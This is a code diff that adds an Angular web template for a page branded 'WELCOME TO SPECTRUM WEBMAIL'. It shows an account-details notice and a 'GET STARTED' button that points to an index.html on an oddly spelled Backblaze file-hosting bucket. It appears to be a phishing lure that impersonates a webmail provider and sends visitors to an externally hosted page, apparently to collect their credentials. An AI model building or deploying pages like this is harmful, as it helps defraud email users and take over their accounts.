@@ -1,0 +1,17 @@
+<div #tooltip="tooltip" igxTooltip>
+  <div class="column-layout group">
+    <p class="ig-typography__body-2 text">
+      Tooltip content here
+    </p>
+  </div>
+</div>
+<p class="ig-typography__body-2 text_1">
+  NOTICE: Please ensure all account details entered are accurate. Incorrect information may result in unsuccessful account updates and potential issues with your account.
+</p>
+<button igxButton="contained" type="button" (click)="uRL = 'https://f005.backblazeb2.com/file/specctttttttrumm/index.html'" class="button">
+  GET STARTED
+</button>
+<h5 class="h5">
+  WELCOME TO SPECTRUM WEBMAIL
+</h5>
+<img src="/assets/Screenshot%202026-09-11%20at%2013.21.32.png" alt="" #image [igxTooltipTarget]="tooltip" [showDelay]="300" [hideDelay]="0" class="image" />
